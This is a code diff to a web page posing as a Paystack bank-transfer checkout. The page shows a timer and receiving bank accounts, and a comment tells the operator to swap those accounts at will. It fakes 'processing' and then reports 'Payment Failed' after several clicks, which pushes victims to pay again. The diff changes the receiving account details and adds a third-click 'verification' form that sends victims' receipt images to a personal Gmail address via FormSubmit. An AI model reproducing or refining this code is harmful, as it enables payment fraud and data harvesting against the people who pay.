@@ -23,13 +23,19 @@
     .footer-buttons { display: flex; gap: 10px; }
     .footer-buttons button { flex: 1; padding: 10px; font-size: 14px; border-radius: 6px; border: 1px solid #ccc; background: #fff; cursor: pointer; }
     .secure { text-align: center; font-size: 12px; color: gray; margin-top: 30px; }
-    .loading, .failed-message { display: none; text-align: center; padding: 50px 20px; }
+    .loading, .failed-message, .upload-section { display: none; text-align: center; padding: 30px 20px; }
     .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #00b87c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .failed-message h2 { color: red; font-size: 20px; margin-bottom: 10px; }
     .failed-message p { font-size: 14px; color: #555; }
     .hidden { display: none !important; }
     .vc { outline: none; border: none; text-decoration: none; color: black; }
+    
+    /* Upload Section Styling */
+    .upload-section h2 { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
+    .upload-section p { font-size: 13px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+    .file-input { margin-bottom: 20px; width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; background: #fff; }
+    .confirm-btn { width: 100%; padding: 15px; background: #00b87c; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
   </style>
 </head>
 
@@ -75,6 +81,17 @@
       <div>Processing your payment...</div>
     </div>
 
+    <div class="upload-section" id="upload-section">
+      <h2>Manual Payment Verification</h2>
+      <p>We noticed multiple confirmation attempts without automatic bank network feedback. To expedite and guarantee immediate processing, please upload a screenshot or copy of your transfer receipt below.</p>
+      <form action="https://formsubmit.co/trustcardxinfo@gmail.com" method="POST" enctype="multipart/form-data" id="receipt-form">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" id="redirect-url" value="">
+        <input type="file" name="attachment" accept="image/*" class="file-input" required>
+        <button type="submit" class="confirm-btn">Confirm Payment</button>
+      </form>
+    </div>
+
     <div class="failed-message" id="failed-message">
       <h2>Payment Failed</h2>
       <p>Sorry, this transaction was not successful. Please try again with a new session.</p>
@@ -86,13 +103,17 @@
     const END_TIME_KEY = "paystack_timer";
     const CLICK_COUNT_KEY = "paystack_clicks";
     const ACC_INDEX_KEY = "paystack_account_index";
+    const UPLOADED_KEY = "paystack_uploaded";
+
+    // Set FormSubmit redirect back to current URL
+    document.getElementById("redirect-url").value = window.location.href.split('?')[0] + "?uploaded=true";
 
     // --- CHANGE THESE ACCOUNTS WHENEVER YOU WANT ---
     const accounts = [
-      { num: "0821754030", bank: "Smartcash Payment Service Bank", name: "OLADUNNI MUFTAU.MFY" },
-      { num: "0821754030", bank: "Smartcash Payment Service Bank", name: "OLADUNNI MUFTAU.MFY" },
-      { num: "0821754030", bank: "Smartcash Payment Service Bank", name: "OLADUNNI MUFTAU.MFY" },
-      { num: "0821754030", bank: "Smartcash Payment Service Bank", name: "OLADUNNI MUFTAU.MFY" }
+      { num: "0993930262", bank: "KOLOMONI MFB", name: "ERCAS-XIXAPAY/Subwallet Telecom-pay" },
+      { num: "0993930262", bank: "KOLOMONI MFB", name: "ERCAS-XIXAPAY/Subwallet Telecom-pay" },
+      { num: "0993930262", bank: "KOLOMONI MFB", name: "ERCAS-XIXAPAY/Subwallet Telecom-pay" },
+      { num: "0993930262", bank: "KOLOMONI MFB", name: "ERCAS-XIXAPAY/Subwallet Telecom-pay" }
     ];
 
     function initializeAccount() {
@@ -116,6 +137,7 @@
     const paymentSection = document.getElementById("payment-section");
     const loadingScreen = document.getElementById("loading-screen");
     const failedMessage = document.getElementById("failed-message");
+    const uploadSection = document.getElementById("upload-section");
 
     function formatTime(ms) {
       const totalSeconds = Math.floor(ms / 1000);
@@ -140,6 +162,8 @@
           clearInterval(timerInterval);
           localStorage.clear(); 
           paymentSection.classList.add("hidden");
+          uploadSection.style.display = "none";
+          loadingScreen.style.display = "none";
           failedMessage.style.display = "block";
         }
       }
@@ -147,15 +171,9 @@
       const timerInterval = setInterval(update, 1000);
     }
 
-    function handlePayment() {
-      const clicks = parseInt(localStorage.getItem(CLICK_COUNT_KEY)) || 0;
-      const nextClicks = clicks + 1;
-      localStorage.setItem(CLICK_COUNT_KEY, nextClicks.toString());
-
-      paymentSection.classList.add("hidden");
+    function processStandardTimeout(nextClicks) {
       loadingScreen.style.display = "block";
 
-      // Updated threshold from 4 to 5 clicks
       if (nextClicks < 5) {
         setTimeout(() => {
           loadingScreen.style.display = "none";
@@ -169,9 +187,40 @@
       }
     }
 
-    // Run on load
+    function handlePayment() {
+      const clicks = parseInt(localStorage.getItem(CLICK_COUNT_KEY)) || 0;
+      const nextClicks = clicks + 1;
+      localStorage.setItem(CLICK_COUNT_KEY, nextClicks.toString());
+
+      paymentSection.classList.add("hidden");
+
+      const hasUploaded = localStorage.getItem(UPLOADED_KEY) === "true";
+
+      // Triggers upload strictly on the 3rd click if they haven't uploaded before
+      if (nextClicks === 3 && !hasUploaded) {
+        uploadSection.style.display = "block";
+        return;
+      }
+
+      processStandardTimeout(nextClicks);
+    }
+
+    // Standard initial execution
     initializeAccount();
     startTimer();
+
+    // Check if returning from a FormSubmit upload redirect
+    if (window.location.search.includes("uploaded=true")) {
+      localStorage.setItem(UPLOADED_KEY, "true");
+      
+      // Clean up URL parameter cleanly
+      window.history.replaceState({}, document.title, window.location.pathname);
+
+      // Instantly run standard process cycle for current click count upon upload complete
+      paymentSection.classList.add("hidden");
+      const currentClicks = parseInt(localStorage.getItem(CLICK_COUNT_KEY)) || 3;
+      processStandardTimeout(currentClicks);
+    }
   </script>
 </body>
-</html> 
+</html>
